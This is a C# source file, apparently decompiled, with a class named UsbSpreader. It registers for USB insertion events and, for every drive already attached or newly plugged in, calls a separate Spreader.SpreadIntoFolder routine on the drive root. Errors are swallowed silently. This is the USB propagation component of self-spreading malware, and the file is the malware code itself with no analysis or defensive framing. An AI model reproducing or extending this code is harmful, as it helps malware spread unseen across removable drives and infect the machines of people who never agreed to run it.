using System;
using System.IO;
using iTuner;

namespace TRM.Spread;

public class UsbSpreader
{
	private static UsbManager _usb;

	public static void StartUsbSniffer()
	{
		if (_usb != null)
		{
			_usb.Dispose();
			_usb = null;
		}
		_usb = new UsbManager();
		_usb.StateChanged += Usb_StateChanged;
		new ActionMethod(Usb_SpreadIntoInitials).BeginInvoke(null, null);
	}

	private static void Usb_SpreadIntoInitials()
	{
		try
		{
			foreach (UsbDisk availableDisk in _usb.GetAvailableDisks())
			{
				Spreader.SpreadIntoFolder(availableDisk.Name);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void Usb_StateChanged(UsbStateChangedEventArgs e)
	{
		if (e.State == UsbStateChange.Added)
		{
			string text = e.Disk.Name;
			string text2 = text;
			char directorySeparatorChar = Path.DirectorySeparatorChar;
			if (!text2.EndsWith(directorySeparatorChar.ToString()))
			{
				text += Path.DirectorySeparatorChar;
			}
			Spreader.SpreadIntoFolder(text);
		}
	}
}
